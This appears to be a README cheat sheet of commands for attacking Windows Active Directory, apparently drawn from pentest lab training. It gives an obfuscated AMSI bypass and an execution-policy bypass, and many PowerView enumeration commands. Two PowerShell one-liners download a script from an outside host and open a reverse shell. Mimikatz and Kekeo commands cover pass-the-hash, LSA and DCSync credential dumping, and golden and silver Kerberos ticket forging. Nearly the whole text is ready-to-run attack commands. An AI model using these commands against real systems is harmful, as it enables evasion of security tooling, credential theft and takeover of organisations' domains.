# Active-directory-small-cheatsheet
Small easy to find cheat sheet for Active directory exploitation

**Amsi bypass:-**

sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


**Powershell Execution policy Bypass:-**

`powershell -ep bypass`


**Tips**

To input the output of the first command into second command use this powershell technique


`<First command> | %{<Second command> -<argument> $_}`

%{} is an alias for ForEach-Object{}

?{} is an alias for Where-Object{}

$_ is variable


To filter out an object type we can use this technique with pipe.

`?{$_.<object> -eq '<value>’'}`


##Enumeration:-

**To find local admin access:-**

Find-LocalAdminAccess


**To get Domain sid:-**

Get-DomainSID 

Arguments -Domain “domain name”


**To get DC:-**

Get-NetDomainController

Arguments -Domain “domain name”



**To get users in current domain:-**

Get-NetUser

Arguments  -UserName “username”




**To get user properties:-**

Get-UserProperty

Arguments -Properties pwdlastset



**Search for a particular string in a user's attributes:-**

Find-UserField -SearchField Description -SearchTerm ”built”


**To Get all computers:-**

Get-NetComputer -FullData

Many arguments -OperatingSystem -Ping -FullData


**To get groups:-**

Get-NetGroup

Arguments -FullData -Domain


**To get members of a particular group:-**

Get-NetGroupMember -GroupName "Domain Admins"


**To Group Policies**

Get-NetGPO
Get-NetGPO -ComputerName <Name of the PC>
Get-NetGPOGroup

**To Get users that are part of a Machine's local Admin group**
Find-GPOComputerAdmin -ComputerName <ComputerName>



**To get OUs:**

Get-NetOU -FullData 
Get-NetGPO -GPOname <The GUID of the GPO>



**Mapping forest:-**

Get-NetForest -Verbose

Get-NetForestDomain -Verbose



**Mapping trust:-**

Get-NetDomainTrust
 
Arguments -Domain

Get-NetForestDomain -Verbose | Get-NetDomainTrust




**Finding Constrained Delegation:-**

Get-DomainUser -TrustedToAuth (Poweview Dev.)


**Finding UnConstrained Delegation:-**

Get-NetComputer -UnConstrained



**To get ACLs**

Get-ObjectAcl -SamAccountName <AccountName> -ResolveGUIDs
Get-ObjectAcl -ADSprefix 'CN=Administrator, CN=Users' -Verbose

**To Search for interesting ACEs**

Invoke-ACLScanner -ResolveGUIDs




##Command Execution techniques for reverse shells.

`powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.113/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443`

`powershell.exe iex (iwr http://172.16.100.113/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.113 -Port 443`



##Mimikatz

**Make ntlm ps-session:-**

Invoke-Mimikatz -Command '"sekurlsa::pth /user:<username> /domain:<Domain name> /ntlm:<ntlm hash for user> /run:powershell.exe"'



**Dump creds:-**

`Invoke-Mimikatz

Invoke-Mimikatz -Command ‘“lsadump::lsa /patch”’

Invoke-Mimikatz -Command '"lsadump::dcsync /user:<user>\krbtgt"'

(dcsync requires 3 permission )`


#Tickets

**Inject ticket:-**

`Invoke-Mimikatz -Command '"kerberos::ptt <location of .kirbi tkt>"'`

**Export Tickets:-**

`Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'`

**Golden tkt**

`Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:<krbtgt hash>   id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'`

**Silver tkt**

`Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<target> /service:<ServiceType> /rc4:<rc4 NTLM Hash of user> /user:<UserToImpersonate> /ptt"'`

**TGT tkt**

kekeo.exe 
`tgt::ask /user:<user name> /domain:<domain name> /rc4:<rc4 NTLM Hash of user>`

Here the rc4 hash is for the user who is allowed to delegate.

**TGS tkt**

Kekeo.exe

`tgs::s4u /tgt:tgt_ticket.kirbi /user:<user>@<domain> /service:<service name>/<server name>`







